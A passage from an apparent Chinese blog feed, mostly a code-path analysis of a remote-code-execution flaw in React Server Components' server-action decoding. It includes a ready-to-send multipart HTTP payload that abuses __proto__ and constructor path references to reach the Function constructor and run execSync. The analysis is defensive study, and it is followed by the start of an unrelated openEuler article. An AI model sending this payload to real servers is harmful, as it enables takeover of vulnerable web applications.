│   │ reviveModel() - 遍历每个属性:                                         │  │
│   │                                                                      │  │
│   │   "then": "$1:__proto__:then"                                        │  │
│   │      └── parseModelString()                                          │  │
│   │            └── getOutlinedModel("1:__proto__:then")                  │  │
│   │                  └── <span class="hljs-attr">path</span> = [<span class="hljs-string">"1"</span>, <span class="hljs-string">"__proto__"</span>, <span class="hljs-string">"then"</span>]               │  │
│   │                  └── <span class="hljs-attr">chunk1</span> = getChunk(<span class="hljs-number">1</span>)  // <span class="hljs-string">"$@0"</span> → chunk0         │  │
│   │                  └── <span class="hljs-attr">value</span> = chunk0[<span class="hljs-string">"__proto__"</span>][<span class="hljs-string">"then"</span>]             │  │
│   │                  └── 返回 Chunk.prototype.then  🔴                   │  │
│   │                                                                      │  │
│   │   "_formData.get": "$1:constructor:constructor"                      │  │
│   │      └── <span class="hljs-attr">path</span> = [<span class="hljs-string">"1"</span>, <span class="hljs-string">"constructor"</span>, <span class="hljs-string">"constructor"</span>]                  │  │
│   │      └── <span class="hljs-attr">value</span> = Object.constructor = Function  🔴                   │  │
│   │                                                                      │  │
│   └──────────────────────────────────────────────────────────────────────┘  │
│        │                                                                    │
│        ▼                                                                    │
│   ┌──────────────────────────────────────────────────────────────────────┐  │
│   │ 结果: 包含以下内容的恶意对象:                                          │  │
│   │   - <span class="hljs-attr">then</span> = Chunk.prototype.then (使其变为 thenable)                  │  │
│   │   - <span class="hljs-attr">_response._formData.get</span> = Function 构造函数                      │  │
│   │   - <span class="hljs-attr">_response._prefix</span> = 恶意代码字符串                                │  │
│   └──────────────────────────────────────────────────────────────────────┘  │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
</code></pre>
</details>
<hr/>
<h3 data-id="heading-28">Payload 详情</h3>
<pre><code class="hljs language-http" lang="http">POST / HTTP/1.1
Host: localhost
Next-Action: x
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad

------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="0"

{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\"then\":\"$B1337\"}","_response":{"_prefix":"process.mainModule.require('child_process').execSync('say haha');","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}
------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="1"

"$@0"
------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="2"

[]
------WebKitFormBoundaryx8jO2oVc6SWP3Sad--
</code></pre>
<h4 data-id="heading-29">Payload 结构拆解</h4>

























<table><thead><tr><th>字段</th><th>值</th><th>目的</th></tr></thead><tbody><tr><td><code>0</code></td><td>主 JSON Payload</td><td>带有恶意 <code>_response</code> 的伪造 Chunk 对象</td></tr><tr><td><code>1</code></td><td><code>"$@0"</code></td><td>Promise 引用，创建循环依赖</td></tr><tr><td><code>2</code></td><td><code>[]</code></td><td>空数组，用于 Map 引用的占位符</td></tr></tbody></table>
<h4 data-id="heading-30">主 Payload 对象</h4>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"then"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"$1:__proto__:then"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"status"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"resolved_model"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"reason"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">-1</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"value"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"{\"then\":\"$B1337\"}"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"_response"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"_prefix"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"process.mainModule.require('child_process').execSync('say haha');"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"_chunks"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"$Q2"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"_formData"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"get"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"$1:constructor:constructor"</span>
    <span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<hr/>
<h3 data-id="heading-31">详细代码路径分析</h3>
<h4 data-id="heading-32">阶段 1: 入口点</h4>
<p><strong>文件:</strong> <code>packages/react-server/src/ReactFlightActionServer.js</code></p>
<pre><code class="hljs language-scss" lang="scss">POST / → <span class="hljs-built_in">decodeAction</span>() → <span class="hljs-built_in">decodeBoundActionMetaData</span>()
                              ↓
                         <span class="hljs-built_in">createResponse</span>(serverManifest, formFieldPrefix, undefined, body)
                              ↓
                         <span class="hljs-built_in">getRoot</span>(actionResponse)  <span class="hljs-comment">// 返回 Chunk 0 (作为 thenable)</span>
                              ↓
                         refPromise<span class="hljs-selector-class">.then</span>(() =&gt; {})  <span class="hljs-comment">// 第 75 行 - 强制解析</span>
</code></pre>
<p><strong>代码 (56-81 行):</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">decodeBoundActionMetaData</span>(<span class="hljs-params">body, serverManifest, formFieldPrefix</span>) {
  <span class="hljs-keyword">const</span> actionResponse = <span class="hljs-title function_">createResponse</span>(
    serverManifest,
    formFieldPrefix,
    <span class="hljs-literal">undefined</span>,
    body,
  );
  <span class="hljs-title function_">close</span>(actionResponse);
  <span class="hljs-keyword">const</span> refPromise = <span class="hljs-title function_">getRoot</span>(actionResponse);

  <span class="hljs-comment">// 强制初始化</span>
  refPromise.<span class="hljs-title function_">then</span>(<span class="hljs-function">() =&gt;</span> {});  <span class="hljs-comment">// ← 触发点 (TRIGGER POINT)</span>

  <span class="hljs-keyword">if</span> (refPromise.<span class="hljs-property">status</span> !== <span class="hljs-string">'fulfilled'</span>) {
    <span class="hljs-keyword">throw</span> refPromise.<span class="hljs-property">reason</span>;
  }
  <span class="hljs-keyword">return</span> refPromise.<span class="hljs-property">value</span>;
}
</code></pre>
<p>在 <strong>第 75 行</strong>，对 Root Chunk 调用 <code>.then()</code>，触发了整个利用链。</p>
<hr/>
<h4 data-id="heading-33">阶段 2: Chunk 解析与原型链访问</h4>
<p><strong>文件:</strong> <code>packages/react-server/src/ReactFlightReplyServer.js</code></p>
<p><strong>代码 (127-143 行):</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title class_">Chunk</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">then</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">resolve, reject</span>) {
  <span class="hljs-keyword">const</span> chunk = <span class="hljs-variable language_">this</span>;
  <span class="hljs-keyword">switch</span> (chunk.<span class="hljs-property">status</span>) {
    <span class="hljs-keyword">case</span> <span class="hljs-attr">RESOLVED_MODEL</span>:
      <span class="hljs-title function_">initializeModelChunk</span>(chunk);  <span class="hljs-comment">// 第 137 行 - 触发解析</span>
      <span class="hljs-keyword">break</span>;
  }
  <span class="hljs-comment">// 初始化后状态可能已改变</span>
  <span class="hljs-keyword">switch</span> (chunk.<span class="hljs-property">status</span>) {
    <span class="hljs-keyword">case</span> <span class="hljs-attr">INITIALIZED</span>:
      <span class="hljs-title function_">resolve</span>(chunk.<span class="hljs-property">value</span>);  <span class="hljs-comment">// 第 143 行 - 将值传递给 Promise 链</span>
      <span class="hljs-keyword">break</span>;
    <span class="hljs-comment">// ...</span>
  }
}
</code></pre>
<p>当 Chunk 0（包含 Payload）被解析时：</p>
<ol>
<li><code>initializeModelChunk</code> 解析 JSON。</li>
<li><code>reviveModel</code> 递归处理所有属性。</li>
</ol>
<hr/>
<h4 data-id="heading-34">阶段 3: 关键漏洞 —— 路径遍历</h4>
<p><strong>文件:</strong> <code>packages/react-server/src/ReactFlightReplyServer.js</code></p>
<p><strong>代码 (595-616 行):</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">getOutlinedModel</span>(<span class="hljs-params">response, reference, parentObject, key, map</span>) {
  <span class="hljs-keyword">const</span> path = reference.<span class="hljs-title function_">split</span>(<span class="hljs-string">':'</span>);  <span class="hljs-comment">// "1:__proto__:then" → ["1", "__proto__", "then"]</span>
  <span class="hljs-keyword">const</span> id = <span class="hljs-built_in">parseInt</span>(path[<span class="hljs-number">0</span>], <span class="hljs-number">16</span>);
  <span class="hljs-keyword">const</span> chunk = <span class="hljs-title function_">getChunk</span>(response, id);

  <span class="hljs-comment">// ... chunk 初始化 ...</span>

  <span class="hljs-keyword">switch</span> (chunk.<span class="hljs-property">status</span>) {
    <span class="hljs-keyword">case</span> <span class="hljs-attr">INITIALIZED</span>:
      <span class="hljs-keyword">let</span> value = chunk.<span class="hljs-property">value</span>;
      <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">1</span>; i &lt; path.<span class="hljs-property">length</span>; i++) {
        value = value[path[i]];  <span class="hljs-comment">// 614-615 行: 没有净化处理!</span>
      }
      <span class="hljs-keyword">return</span> <span class="hljs-title function_">map</span>(response, value);
  }
}
</code></pre>
<h5 data-id="heading-35">漏洞分析</h5>
<p>冒号分隔的路径允许访问 <strong>任何</strong> 属性，包括：</p>
<ul>
<li><code>__proto__</code> - 访问原型链</li>
<li><code>constructor</code> - 访问构造函数</li>
</ul>
<p><strong>这里没有任何验证来阻止危险的属性访问。</strong></p>
<hr/>
<h4 data-id="heading-36">阶段 4: 窃取 <code>Chunk.prototype.then</code></h4>
<p>当 <code>$1:__proto__:then</code> 被解析时：</p>
<pre><code class="hljs language-ini" lang="ini">$1:__proto__:then
    ↓
<span class="hljs-attr">path</span> = [<span class="hljs-string">"1"</span>, <span class="hljs-string">"__proto__"</span>, <span class="hljs-string">"then"</span>]
    ↓
<span class="hljs-attr">chunk1</span> = getChunk(response, <span class="hljs-number">1</span>)  // 包含 <span class="hljs-string">"$@0"</span>
    ↓
"$@0" 解析为 chunk0 (Chunk 对象本身)
    ↓
<span class="hljs-attr">value</span> = chunk0[<span class="hljs-string">"__proto__"</span>]     // = Chunk.prototype (继承自 Promise.prototype)
    ↓
<span class="hljs-attr">value</span> = value[<span class="hljs-string">"then"</span>]           // = Chunk.prototype.then 函数
</code></pre>
<p><strong>结果：</strong> Payload 的 <code>then</code> 属性现在持有了 <code>Chunk.prototype.then</code>，使该 Payload 对象变为了一个 <strong>Thenable</strong> 对象。</p>
<hr/>
<h4 data-id="heading-37">阶段 5: 获取 Function 构造函数</h4>
<p>当 <code>$1:constructor:constructor</code> 被解析时：</p>
<pre><code class="hljs language-ini" lang="ini">$1:constructor:constructor
    ↓
<span class="hljs-attr">path</span> = [<span class="hljs-string">"1"</span>, <span class="hljs-string">"constructor"</span>, <span class="hljs-string">"constructor"</span>]
    ↓
<span class="hljs-attr">chunk1.value</span> = chunk0 (解析后的对象)
    ↓
<span class="hljs-attr">value</span> = chunk0[<span class="hljs-string">"constructor"</span>]    // = Object
    ↓
<span class="hljs-attr">value</span> = Object[<span class="hljs-string">"constructor"</span>]    // = Function 构造函数
</code></pre>
<p><strong>结果：</strong> <code>_formData.get</code> 属性变成了 <strong>Function 构造函数</strong>。</p>
<hr/>
<h4 data-id="heading-38">阶段 6: 伪造 Chunk 被视为真实 Chunk</h4>
<p><strong>文件:</strong> <code>packages/react-server/src/ReactFlightReplyServer.js</code></p>
<p><strong>代码 (135-137 行):</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">switch</span> (chunk.<span class="hljs-property">status</span>) {
  <span class="hljs-keyword">case</span> <span class="hljs-attr">RESOLVED_MODEL</span>:         <span class="hljs-comment">// Payload 具有 status: "resolved_model"</span>
    <span class="hljs-title function_">initializeModelChunk</span>(chunk);  <span class="hljs-comment">// 使用 PAYLOAD 作为 "chunk" 调用!</span>
</code></pre>
<p>Payload 完美地<strong>模仿</strong>了 Chunk 的结构：</p>






























<table><thead><tr><th>Chunk 属性</th><th>Payload 值</th><th>目的</th></tr></thead><tbody><tr><td><code>status</code></td><td><code>"resolved_model"</code></td><td>匹配 <code>RESOLVED_MODEL</code> 常量</td></tr><tr><td><code>value</code></td><td><code>"{\"then\":\"$B1337\"}"</code></td><td>待解析的内部 Payload</td></tr><tr><td><code>reason</code></td><td><code>-1</code></td><td>模仿 Chunk ID</td></tr><tr><td><code>_response</code></td><td><code>{...malicious...}</code></td><td><strong>注入的恶意 Response 对象</strong></td></tr></tbody></table>
<hr/>
<h4 data-id="heading-39">阶段 7: 恶意 Response 对象注入</h4>
<p><strong>文件:</strong> <code>packages/react-server/src/ReactFlightReplyServer.js</code></p>
<p><strong>代码 (446-474 行):</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">initializeModelChunk</span>(<span class="hljs-params">chunk</span>) {
  <span class="hljs-comment">// ...</span>
  <span class="hljs-keyword">const</span> resolvedModel = chunk.<span class="hljs-property">value</span>;     <span class="hljs-comment">// = "{\"then\":\"$B1337\"}"</span>
  <span class="hljs-comment">// ...</span>
  <span class="hljs-keyword">const</span> rawModel = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(resolvedModel);

  <span class="hljs-keyword">const</span> value = <span class="hljs-title function_">reviveModel</span>(
    chunk.<span class="hljs-property">_response</span>,  <span class="hljs-comment">// ← 使用伪造的 _response!</span>
    {<span class="hljs-string">''</span>: rawModel},
    <span class="hljs-string">''</span>,
    rawModel,
    rootReference,
  );
}
</code></pre>
<p>伪造的 <code>_response</code> 包含：</p>
<pre><code class="hljs language-javascript" lang="javascript">{
  <span class="hljs-string">"_prefix"</span>: <span class="hljs-string">"process.mainModule.require('child_process').execSync('say haha');"</span>,
  <span class="hljs-string">"_formData"</span>: {<span class="hljs-string">"get"</span>: <span class="hljs-title class_">Function</span>}  <span class="hljs-comment">// 已经解析为 Function 构造函数!</span>
}
</code></pre>
<p><strong>关键问题：</strong> 没有验证 <code>chunk._response</code> 是否为合法的 Response 对象。</p>
<hr/>
<h4 data-id="heading-40">阶段 8: 通过 $B 引用执行代码</h4>
<p><strong>文件:</strong> <code>packages/react-server/src/ReactFlightReplyServer.js</code></p>
<p><strong>代码 (1059-1067 行):</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">case</span> <span class="hljs-string">'B'</span>: {  <span class="hljs-comment">// Blob 引用</span>
  <span class="hljs-keyword">const</span> id = <span class="hljs-built_in">parseInt</span>(value.<span class="hljs-title function_">slice</span>(<span class="hljs-number">2</span>), <span class="hljs-number">16</span>);  <span class="hljs-comment">// 0x1337 = 4919</span>
  <span class="hljs-keyword">const</span> prefix = response.<span class="hljs-property">_prefix</span>;           <span class="hljs-comment">// 恶意代码字符串</span>
  <span class="hljs-keyword">const</span> blobKey = prefix + id;               <span class="hljs-comment">// "process.mainModule...execSync('say haha');4919"</span>

  <span class="hljs-keyword">const</span> backingEntry = response.<span class="hljs-property">_formData</span>.<span class="hljs-title function_">get</span>(blobKey);  <span class="hljs-comment">// Function(blobKey)!</span>
  <span class="hljs-keyword">return</span> backingEntry;
}
</code></pre>
<h5 data-id="heading-41">执行流程</h5>
<pre><code class="hljs language-javascript" lang="javascript">response.<span class="hljs-property">_formData</span>.<span class="hljs-title function_">get</span>(blobKey)
    ↓
<span class="hljs-comment">// _formData.get 已经被替换为 Function 构造函数</span>
<span class="hljs-title class_">Function</span>(<span class="hljs-string">"process.mainModule.require('child_process').execSync('say haha');4919"</span>)
    ↓
<span class="hljs-comment">// 返回一个匿名函数，函数体为:</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">anonymous</span>(<span class="hljs-params"/>) {
  process.<span class="hljs-property">mainModule</span>.<span class="hljs-built_in">require</span>(<span class="hljs-string">'child_process'</span>).<span class="hljs-title function_">execSync</span>(<span class="hljs-string">'say haha'</span>);
  <span class="hljs-number">4919</span>
}
</code></pre>
<hr/>
<h4 data-id="heading-42">阶段 9: 最终触发 —— RCE</h4>
<p>返回的 Function 对象变成了内部对象 <code>{then: &lt;Function&gt;}</code> 的 <code>then</code> 属性。</p>
<p>当 Promise 解析遇到这个 Thenable 对象时：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// JavaScript Promise 内部机制:</span>
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> value.<span class="hljs-property">then</span> === <span class="hljs-string">'function'</span>) {
  value.<span class="hljs-title function_">then</span>(resolve, reject);  <span class="hljs-comment">// 调用恶意函数！</span>
}
</code></pre>
<p><strong>调用该函数将执行：</strong></p>
<pre><code class="hljs language-javascript" lang="javascript">process.<span class="hljs-property">mainModule</span>.<span class="hljs-built_in">require</span>(<span class="hljs-string">'child_process'</span>).<span class="hljs-title function_">execSync</span>(<span class="hljs-string">'say haha'</span>)
</code></pre>
<p><strong>🔴 RCE 达成。</strong></p>
<hr/>
<h3 data-id="heading-43">漏洞利用流程可视化</h3>
<pre><code class="hljs language-javascript" lang="javascript">┌───────────────────────────────────────────────────────────────────────┐
│                         <span class="hljs-variable constant_">PAYLOAD</span> 结构                                  │
├───────────────────────────────────────────────────────────────────────┤
│ <span class="hljs-title class_">Field</span> <span class="hljs-string">"0"</span>: {                                                          │
│   <span class="hljs-string">"then"</span>: <span class="hljs-string">"$1:__proto__:then"</span>,     ──────► 窃取 <span class="hljs-title class_">Chunk</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">then</span>  │
│   <span class="hljs-string">"status"</span>: <span class="hljs-string">"resolved_model"</span>,       ──────► 模仿 <span class="hljs-title class_">Chunk</span>                │
│   <span class="hljs-string">"value"</span>: <span class="hljs-string">"{\"then\":\"$B1337\"}"</span>, ──────► 内部 <span class="hljs-title class_">Payload</span>              │
│   <span class="hljs-string">"_response"</span>: {                                                      │
│     <span class="hljs-string">"_prefix"</span>: <span class="hljs-string">"execSync('say haha');"</span>,  ──► 待执行代码                │
│     <span class="hljs-string">"_formData"</span>: {<span class="hljs-string">"get"</span>: <span class="hljs-string">"$1:constructor:constructor"</span>}  ──► <span class="hljs-title class_">Function</span>  │
│   }                                                                   │
│ }                                                                     │
│                                                                       │
│ <span class="hljs-title class_">Field</span> <span class="hljs-string">"1"</span>: <span class="hljs-string">"$@0"</span>   ──────► 创建指向 <span class="hljs-title class_">Field</span> <span class="hljs-number">0</span> 的循环引用                 │
│ <span class="hljs-title class_">Field</span> <span class="hljs-string">"2"</span>: <span class="hljs-string">"[]"</span>    ──────► 空数组占位符                               │
└───────────────────────────────────────────────────────────────────────┘

                              ▼

┌─────────────────────────────────────────────────────────────────────┐
│                         利用链 (<span class="hljs-variable constant_">EXPLOITATION</span> <span class="hljs-variable constant_">CHAIN</span>)                  │
├─────────────────────────────────────────────────────────────────────┤
│  <span class="hljs-number">1.</span> 服务端收到带有 <span class="hljs-title class_">Next</span>-<span class="hljs-title class_">Action</span> 标头的 <span class="hljs-variable constant_">POST</span> 请求                         │
│  <span class="hljs-number">2.</span> <span class="hljs-title function_">decodeAction</span>() → <span class="hljs-title function_">getRoot</span>() → 调用 .<span class="hljs-title function_">then</span>() (第 <span class="hljs-number">75</span> 行)             │
│  <span class="hljs-number">3.</span> $1:<span class="hljs-attr">__proto__</span>:then → 窃取 <span class="hljs-title class_">Chunk</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">then</span>                   │
│  <span class="hljs-number">4.</span> $1:<span class="hljs-attr">constructor</span>:constructor → 获取 <span class="hljs-title class_">Function</span> 构造函数              │
│  <span class="hljs-number">5.</span> <span class="hljs-title class_">Payload</span> 对象变为 <span class="hljs-title class_">Thenable</span> (拥有 .<span class="hljs-property">then</span> 方法)                       │
│  <span class="hljs-number">6.</span> <span class="hljs-title class_">Promise</span> 解析 <span class="hljs-title class_">Payload</span> → 视为 <span class="hljs-title class_">Chunk</span> 处理 → initializeModelChunk    │
│  <span class="hljs-number">7.</span> 使用带有恶意 _prefix 和 _formData.<span class="hljs-property">get</span> 的伪造 _response            │
│  <span class="hljs-number">8.</span> $B1337 → <span class="hljs-title class_">Function</span>(<span class="hljs-string">"malicious code"</span>) 被调用                      │
│  <span class="hljs-number">9.</span> 返回的函数被用作 .<span class="hljs-title function_">then</span>() → 被执行                                  │
│ <span class="hljs-number">10.</span> <span class="hljs-attr">RCE</span>: process.<span class="hljs-property">mainModule</span>.<span class="hljs-built_in">require</span>(<span class="hljs-string">'child_process'</span>).<span class="hljs-title function_">execSync</span>()     │
└─────────────────────────────────────────────────────────────────────┘
</code></pre>
<hr/>
<h3 data-id="heading-44">根因总结</h3>






























<table><thead><tr><th>位置</th><th>行号</th><th>漏洞</th></tr></thead><tbody><tr><td><code>ReactFlightReplyServer.js</code></td><td>614-615</td><td>未经净化的属性路径遍历允许访问 <code>__proto__</code> 和 <code>constructor</code></td></tr><tr><td><code>ReactFlightReplyServer.js</code></td><td>137</td><td>具有匹配 <code>status</code> 属性的伪造对象被当作真实 Chunk 处理</td></tr><tr><td><code>ReactFlightReplyServer.js</code></td><td>468-474</td><td>使用 <code>chunk._response</code> 时未验证其是否为合法的 Response 对象</td></tr><tr><td><code>ReactFlightReplyServer.js</code></td><td>1066</td><td>调用 <code>_formData.get()</code> 时未验证其是否为真实的 FormData 方法</td></tr></tbody></table>
<h3 data-id="heading-45">免责声明</h3>
<p>本分析仅供<strong>教育和防御性安全目的</strong>使用。提供这些信息是为了帮助理解、检测和防止此类漏洞的利用。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[多元算力融合实践：openEuler在中等配置硬件环境下的性能验证]]></title>    <link>https://juejin.cn/post/7579846685072113718</link>    <guid>https://juejin.cn/post/7579846685072113718</guid>    <pubDate>2025-12-05T03:27:13.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7579846685072113718" data-draft-id="7579893536105873414" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="多元算力融合实践：openEuler在中等配置硬件环境下的性能验证"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2025-12-05T03:27:13.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="不是笨小孩135"/> <meta itemprop="url" content="https://juejin.cn/user/3252774571621179"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            多元算力融合实践：openEuler在中等配置硬件环境下的性能验证
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3252774571621179/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    不是笨小孩135
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-05T03:27:13.000Z" title="Fri Dec 05 2025 03:27:13 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读11分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">1. 前言</h2>
<ul>
<li>在数字基础设施高速发展的今天，算力需求正朝着多元化、密集化、分布式方向演进。从中小企业的日常数据处理、开发者的AI模型训练，到边缘设备的轻量化推理，不同场景对算力的形态、性能、能效提出了差异化要求。openEuler
作为面向数字基础设施的开源操作系统，凭借创新的技术架构与优化能力，实现了对中高端通用硬件算力的深度适配与高效调度，为各类计算场景提供了统一、可靠、高性能的技术底座。</li>
